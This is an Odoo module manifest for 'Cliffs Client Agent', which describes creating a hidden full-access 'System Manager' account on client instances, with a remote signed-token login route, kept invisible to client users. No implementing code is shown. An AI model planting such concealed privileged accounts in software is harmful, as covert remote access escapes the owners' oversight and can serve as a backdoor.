{
    'name': 'Cliffs Client Agent',
    'version': '19.0.1.0.0',
    'category': 'Hidden/Tools',
    'summary': 'Provisions the hidden Cliffs System Manager technical account for remote support and monitoring',
    'description': """
Cliffs Client Agent
====================
Installed on every client-managed Odoo instance. Creates a hidden,
full-access "System Manager" technical user for Cliffs support staff and
automated monitoring (AIMS), and exposes a short-lived signed-token login
route so the account can be used remotely without ever storing or
transmitting its password.

This module has no menus and is not meant to be visible to client users.
""",
    'author': 'Cliffs',
    'license': 'LGPL-3',
    'depends': ['base'],
    'data': [
        'security/ir.model.access.csv',
    ],
    'post_init_hook': '_create_system_manager',
    'installable': True,
    'application': False,
    'auto_install': False,
}
